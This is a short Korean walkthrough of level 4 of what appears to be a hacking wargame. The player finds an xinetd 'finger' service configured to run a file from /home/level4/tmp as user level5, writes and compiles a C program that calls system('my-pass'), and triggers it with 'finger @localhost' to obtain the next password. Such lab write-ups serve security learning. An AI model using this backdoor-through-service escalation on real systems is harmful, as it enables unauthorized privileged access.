level 4
===
1. 힌트 파일을 열어본다.(cat hint)
 -누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!-라고 적혀있다.
 2. /etc/xinetd.d/에 접근해서 backdoor파일을 확인(cat backdoor)해 보면 다음과 같이 적혀있다. 
 ```
 service finger
 {
     disable = no
     flags            =REUSE
     socket_type      =stream
     wait             =no
     user             =level5
     server           =/home/level4/tmp/backdoor
     log_on_failure   +=USERID
 }
```
 내용을 살펴보니 level5권한으로 backdoor를 주는 것같다. 
 3. server에 직접 접근(/home/level4/tmp)해서 backdoor를 실행하자.
 그러나 backdoor파일이 없어서 다음과 같은 파일을 만들었다. 
 ```c
 #include<stdio.h>

 int main(){
     system("my-pass");
     return 0;
 }
 ```
4. backdoor.c을 컴파일한다.(gcc -o backdoor backdoor.c)
5. 이제 finger service를 이용하여 level5의 password를 알아낸다. 이용방법은 다음과 같다. 
finger @localhost